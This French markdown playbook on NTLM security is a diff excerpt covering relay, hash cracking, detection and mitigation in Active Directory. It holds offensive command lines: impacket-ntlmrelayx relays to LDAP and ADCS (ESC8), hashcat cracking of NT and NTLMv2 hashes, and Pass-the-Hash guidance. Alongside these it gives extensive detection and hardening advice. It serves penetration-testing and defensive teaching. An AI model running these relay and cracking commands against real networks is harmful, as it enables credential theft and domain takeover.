+impacket-ntlmrelayx -t ldap://dc01.domain.local --delegate-access
+
+# Relay vers ADCS (ESC8) pour obtenir un certificat
+impacket-ntlmrelayx -t http://ca.domain.local/certsrv/certfnsh.asp --adcs --template DomainController
+```
+
+> [!IMPORTANT]
+> Pour le relay, il faut **désactiver les serveurs SMB et HTTP dans la configuration de Responder** (`Responder.conf`), pas via des flags en ligne de commande. Le flag `--disable-ess` n'existe pas dans les versions modernes de Responder. Responder sert uniquement à déclencher la coercition (LLMNR/NBT-NS poisoning), tandis que ntlmrelayx écoute sur les ports SMB (445) et HTTP (80/443) pour intercepter et relayer l'authentification.
+
+**Conditions pour que le relay fonctionne** :
+
+| Condition                                | Détail                                                                                                             | Référence                                                                                                                                 |
+| ---------------------------------------- | ------------------------------------------------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------------------------------------------------- |
+| **SMB Signing désactivé** sur la cible   | Indispensable pour le relay SMB (le signing rend la session invalide car l'attaquant ne possède pas la clé)        | [MS-SMB2 §3.2.5.3.1](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-smb2/)                                              |
+| **Pas de relay vers soi-même**           | Patché par MS08-068 (novembre 2008). Un serveur vérifie que le challenge qu'il a émis n'est pas celui qu'il reçoit | CVE-2008-4037                                                                                                                             |
+| **Droits suffisants** de la victime      | La session a les droits de la victime sur la cible. Inutile si c'est un compte sans privilège                      | -                                                                                                                                         |
+| **LDAP Signing / Channel Binding (EPA)** | Si activés, le relay LDAP échoue. EPA lie l'authentification au canal TLS sous-jacent                              | [Microsoft - EPA](https://learn.microsoft.com/en-us/dotnet/framework/wcf/feature-details/extended-protection-for-authentication-overview) |
+| **MIC présent et vérifié**               | Si le client envoie un MIC et que le serveur le vérifie, la modification des flags par l'attaquant est détectée    | CVE-2019-1040                                                                                                                             |
+
+**Relay cross-protocole** : NTLM est indépendant du protocole applicatif. Un attaquant peut intercepter une authentification NTLM initiée via un protocole (SMB, HTTP, MSSQL) et la relayer vers un protocole complètement différent (LDAP, HTTP/ADCS). C'est ce qui rend la combinaison **coercition + relay vers LDAP/ADCS** si dévastatrice.
+
+**Cas d'usage les plus courants** :
+
+- **Relay SMB → SMB** : exécution distante (si la victime est admin local sur la cible et SMB signing désactivé).
+- **Relay SMB/HTTP → LDAP** : modification d'objets AD (RBCD, Shadow Credentials, ajout au groupe, ACL abuse).
+- **Relay SMB/HTTP → ADCS HTTP** (ESC8) : obtention d'un certificat au nom de la victime machine ou utilisateur.
+- **Relay vers MSSQL** : exécution de requêtes SQL avec les droits de la victime.
+
+### 4.5 Cracking NTLMv2 vs Cracking NT Hash
+
+Ces deux modes de crack sont souvent confondus. La distinction est importante.
+
+|                     | Hash NT                                  | NTLMv2 (Net-NTLMv2)                                  |
+| ------------------- | ---------------------------------------- | ---------------------------------------------------- |
+| **Origine**         | SAM / LSASS / ntds.dit / DCSync          | Capture réseau (Responder, Responder-like)           |
+| **Format**          | `LMHASH:NTHASH` (souvent `aad3...:hash`) | `user::domain:serverchallenge:NTProofStr:blob`       |
+| **Mode Hashcat**    | `-m 1000`                                | `-m 5600`                                            |
+| **Sel**             | Aucun                                    | ServerChallenge + ClientChallenge + Timestamp        |
+| **Vitesse**         | ~120 GH/s (RTX 4090)                     | ~15 GH/s (RTX 4090) — HMAC-MD5 est plus lent que MD4 |
+| **Réutilisabilité** | Hash NT = équivalent MdP (PtH direct)    | Doit être cracké pour obtenir le MdP ou le hash NT   |
+
+Référence : [Hashcat - Example Hashes](https://hashcat.net/wiki/doku.php?id=example_hashes) (modes 1000 et 5600)
+
+```bash
+# Crack NT Hash (le hash brut, depuis SAM/LSASS/DCSync)
+hashcat -m 1000 nthashes.txt rockyou.txt
+
+# Crack NTLMv2 (capture réseau Responder)
+hashcat -m 5600 ntlmv2.txt rockyou.txt
+```
+
+> [!TIP]
+> Un hash NT extrait de la SAM ou via DCSync est **directement utilisable en Pass-the-Hash** sans jamais avoir besoin de le craquer. Le cracking n'est utile que pour la réutilisation de mot de passe sur d'autres services (cloud, VPN, etc.) ou pour remplir un rapport.
+
+---
+
+## V. Défense et Détection
+
+### 5.1 Event IDs NTLM
+
+Référence : [Microsoft - 4624 Logon Event](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4624) | [Microsoft - 4776 Credential Validation](https://learn.microsoft.com/en-us/windows/security/threat-protection/auditing/event-4776)
+
+| Event ID      | Source           | Où il se log      | Description                                                                                           |
+| ------------- | ---------------- | ----------------- | ----------------------------------------------------------------------------------------------------- |
+| **4624**      | Security         | Machine cible     | Ouverture de session réussie. `Logon Type 3` (réseau) avec `Authentication Package: NTLM`             |
+| **4625**      | Security         | Machine cible     | Échec d'ouverture de session. Contient le `Sub Status` (mauvais MdP, compte inexistant, verrouillé)   |
+| **4648**      | Security         | Machine source    | Connexion avec credentials explicites. Souvent PtH : un processus passe un hash sans login interactif |
+| **4776**      | Security         | **DC uniquement** | Vérification Netlogon (pass-through). Montre le `Logon Account` et la `Source Workstation`            |
+| **4672**      | Security         | Machine cible     | Attribution de privilèges spéciaux (compte admin). Apparaît juste après un 4624 admin                 |
+| **4662**      | Security         | DC                | Opération sur un objet AD. Utilisé pour détecter DCSync (`Replicating Directory Changes`)             |
+| **8001-8004** | NTLM/Operational | Machine concernée | Événements NTLM détaillés (requiert activation du journal Operational)                                |
+
+> [!TIP]
+> Le journal `Microsoft-Windows-NTLM/Operational` doit être activé manuellement via les stratégies de groupe (`Network security: Restrict NTLM: Audit Incoming NTLM Traffic` et `Audit NTLM authentication in this domain`). Il est inestimable pour cartographier l'usage réel de NTLM dans un domaine avant de commencer à le restreindre.
+>
+> Référence : [Microsoft - Restrict NTLM GPO Settings](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-audit-ntlm-authentication-in-this-domain)
+
+### 5.2 Détection des Attaques
+
+**Responder / Poisoning LLMNR-NBT-NS** :
+
+- Pic de requêtes LLMNR (UDP 5355) ou NBT-NS (UDP 137) depuis la même adresse MAC.
+- Même IP répondant à toutes les requêtes LLMNR dans un court intervalle (comportement anormal, un serveur légitime ne répond qu'à son propre nom).
+- Analyser les logs réseau (Zeek, Suricata, ou `PacketMon` natif Windows) pour les réponses LLMNR/NBT-NS provenant d'une adresse non-DNS.
+- Sysmon Event ID **22** (DNS Query) : absence de requête DNS avant une connexion SMB sortante peut indiquer un poisoning réussi.
+
+Référence : [SANS - Detecting Responder](https://www.sans.org/white-papers/) | [Zeek Documentation](https://docs.zeek.org/)
+
+**Pass-the-Hash** :
+
+- **4648** : ouverture de session avec credentials explicites depuis un contexte inhabituel (par exemple, un processus `cmd.exe` ou `powershell.exe` injectant un hash).
+- **4624** Logon Type 3 avec `Authentication Package: NTLM` pour des comptes qui utilisent normalement Kerberos (comptes de domaine, surtout les comptes admin).
+- Absence de **4768** (Kerberos AS-REQ / TGT request) précédant l'accès. Si un compte accède à des ressources réseau sans jamais demander de TGT au DC, il utilise NTLM ou PtH.
+- Adresses IP sources incohérentes avec le profil habituel du compte (latéralisation depuis un poste compromis).
+- Sur le DC : **4776** montrant un compte admin validant NTLM depuis un poste utilisateur inattendu.
+
+Référence : [Microsoft - Mitigating Pass-the-Hash](https://www.microsoft.com/en-us/download/details.aspx?id=36036)
+
+**NTLM Relay** :
+
+- Un seul hôte (l'attaquant) authentifié comme **plusieurs comptes différents** en très peu de temps sur la même cible.
+- **4624** sur la cible avec un compte inattendu depuis une IP inattendue.
+- Activité LDAP inhabituelle depuis un compte normalement non-admin (relay → LDAP pour modifier des ACL, configurer RBCD, ou ajouter un certificat via Shadow Credentials).
+- Création soudaine d'un compte machine ou modification de `msDS-AllowedToActOnBehalfOfOtherIdentity` sans ticket de changement correspondant.
+
+**DCSync (post-exploitation)** :
+
+- **4662** : opération effectuée sur un objet AD avec les GUIDs de droits `DS-Replication-Get-Changes` (`1131f6aa-...`) et `DS-Replication-Get-Changes-All` (`1131f6ad-...`).
+- Source : une machine **autre** qu'un contrôleur de domaine répliquant (champ `Account Name` et `Client Address` dans l'événement).
+- C'est l'événement le plus fiable pour détecter un DCSync.
+
+Référence : [Microsoft - Monitoring AD for Signs of Compromise](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/plan/security-best-practices/monitoring-active-directory-for-signs-of-compromise) | [SpecterOps - Detecting DCSync](https://posts.specterops.io/)
+
+### 5.3 Mitigations
+
+| Mitigation                                                    | Effet                                                                                             | Référence                                                                                                                                                                                       |
+| ------------------------------------------------------------- | ------------------------------------------------------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
+| **Désactiver LLMNR et NBT-NS**                                | Élimine le vecteur de capture Responder par poisoning broadcast                                   | GPO : `Turn off multicast name resolution` / `Disable NetBIOS over TCP/IP` dans les propriétés réseau                                                                                           |
+| **Activer SMB Signing** (obligatoire)                         | Empêche le NTLM Relay vers SMB (signature de chaque paquet avec la SessionKey)                    | [Microsoft - SMB Signing](https://learn.microsoft.com/en-us/troubleshoot/windows-server/networking/overview-server-message-block-signing)                                                       |
+| **Activer LDAP Signing + Channel Binding (EPA)**              | Empêche le NTLM Relay vers LDAP. EPA lie l'authentification NTLM au canal TLS sous-jacent         | [Microsoft - LDAP Channel Binding](https://learn.microsoft.com/en-us/troubleshoot/windows-server/identity/enable-ldap-signing-in-windows-server)                                                |
+| **Activer EPA sur ADCS (IIS)**                                | Empêche le relay HTTP vers les services d'enrôlement de certificats (bloque ESC8)                 | [Microsoft - KB5005413](https://support.microsoft.com/en-us/topic/kb5005413)                                                                                                                    |
+| **Protected Users Security Group**                            | Force Kerberos pour les membres, bloque NTLM côté DC, pas de cache de hash NT sur les endpoints   | [Microsoft - Protected Users](https://learn.microsoft.com/en-us/windows-server/security/credentials-protection-and-management/protected-users-security-group)                                   |
+| **Credential Guard**                                          | Isole LSASS dans un processus VBS (`LSAIso.exe`), hash NT inaccessible aux outils classiques      | [Microsoft - Credential Guard](https://learn.microsoft.com/en-us/windows/security/identity-protection/credential-guard/)                                                                        |
+| **Restreindre NTLM** (GPO : Network Security > Restrict NTLM) | Peut bloquer ou auditer NTLM par serveur, par domaine, par OU. Démarrer par l'audit, puis bloquer | [Microsoft - Restrict NTLM](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-restrict-ntlm-ntlm-authentication-in-this-domain)    |
+| **Comptes de service avec gMSA**                              | Rotation automatique des mots de passe (120 car., 30 jours), PtH moins rentable                   | [Microsoft - gMSA](https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview)                                            |
+| **LAPS (Local Administrator Password Solution)**              | Mots de passe admin locaux uniques par machine, empêche la latéralisation PtH inter-machines      | [Microsoft - Windows LAPS](https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview)                                                                                        |
+| **Désactiver NTLMv1** (obligatoire)                           | `Network security: LAN Manager authentication level` = **NTLMv2 only (niveau 5)**                 | [Microsoft - LAN Manager authentication level](https://learn.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level) |
+| **Appliquer les correctifs MIC**                              | Patcher CVE-2019-1040 et successeurs pour empêcher la suppression du MIC pendant le relay         | [Microsoft - CVE-2019-1040](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2019-1040)                                                                                                |
+
+> [!NOTE]
+> Désactiver NTLM complètement dans un grand domaine Active Directory est une opération à risque : de nombreuses applications legacy en dépendent. La démarche recommandée est :
+>
+> 1. **Auditer** : activer `Audit NTLM` dans les GPO pour cartographier l'usage réel.
+> 2. **Inventorier** : identifier les applications et services qui dépendent encore de NTLM.
+> 3. **Migrer** : convertir les applications vers Kerberos, WHFB ou des alternatives modernes.
+> 4. **Bloquer progressivement** : serveur par serveur, en partant des ressources les plus sensibles (DC, serveurs Tier 0).
+>
+> Référence : [Microsoft - NTLM Blocking and You](https://techcommunity.microsoft.com/blog/identity/ntlm-blocking-and-you-application-analysis-and-auditing-methodologies-in-windows/3488941)
+
+---
+
+## VI. Résumé des Clés et de Qui Fait Quoi
+
+```
+Mot de passe        → MD4(UTF-16LE) → NT Hash (stocké SAM, ntds.dit, LSASS)
+                                          │
+                                          │ NTOWFv2
+                                          ▼
+                    HMAC-MD5( NT_Hash, UNICODE(Uppercase(user) + domain) ) = ResponseKeyNT
+                                          │
+                                          │ + ServerChallenge + ClientChallenge + Timestamp + TargetInfo
+                                          ▼
+                    HMAC-MD5( ResponseKeyNT, ServerChallenge + blob ) = NTProofStr
+                    [NTProofStr ‖ blob transmis sur le réseau, crackable en hashcat -m 5600]
+
+                                          │
+                                          │ Session Key
+                                          ▼
+                    SessionBaseKey = HMAC-MD5( ResponseKeyNT, NTProofStr )
+                    [utilisée pour MIC, signing, sealing]
+
+
+Pass-the-Hash : NT Hash → construire ResponseKeyNT directement
+                          → répondre au challenge sans connaître le mot de passe
+
+NTLM Relay :    NTLMv2_Response capturée → retransmise vers cible
+                                          → session établie avec droits victime
+
+DCSync :        compte avec "Replicating Directory Changes" + "All"
+                → tirer tous les NT Hash du domaine via MS-DRSR
+```
+
+---
+
+## VII. NTLM vs Kerberos : Quand Choisir Quoi
+
+| Critère                         | NTLM                                    | Kerberos                             |
+| ------------------------------- | --------------------------------------- | ------------------------------------ |
+| **Connexion par IP**            | Fonctionne                              | Impossible sans SPN IP (rare)        |
+| **Service sans SPN**            | Fonctionne                              | Impossible                           |
+| **Machine hors domaine**        | Fonctionne                              | Pas de KDC                           |
+| **Authentification mutuelle**   | **Non** — serveur non authentifié       | **Oui** — via AP-REP                 |
+| **Relay réseau**                | Trivial (pas de binding au canal)       | Tickets liés à la session (SPN + IP) |
+| **Pass-the-Hash**               | Hash NT suffisant                       | Overpass-the-Hash nécessaire (RC4)   |
+| **Scalabilité DC**              | Chaque auth passe par le DC (Netlogon)  | Ticket mis en cache côté client      |
+| **Robustesse MitM**             | Relay trivial sans signing/EPA          | Tickets liés, replay limité          |
+| **Performance (accès répétés)** | Challenge-response à chaque connexion   | TGT/TGS réutilisables (cache ccache) |
+| **Session Security (signing)**  | Dérivée de la SessionKey (NTLM signing) | Dérivée de la session key du ticket  |
+
+La règle pratique en engagement : **si la cible accepte NTLM, on exploite NTLM**. Pas besoin de forcer Kerberos si NTLM ouvre la même porte avec moins de prérequis.
+
+Référence : [MS-NLMP](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nlmp/) | [MS-KILE](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-kile/) | [The Hacker Recipes - NTLM vs Kerberos](https://www.thehacker.recipes/ad/movement/ntlm/)
+
+---
+
+_Playbook rédigé par **W4ln3t**_
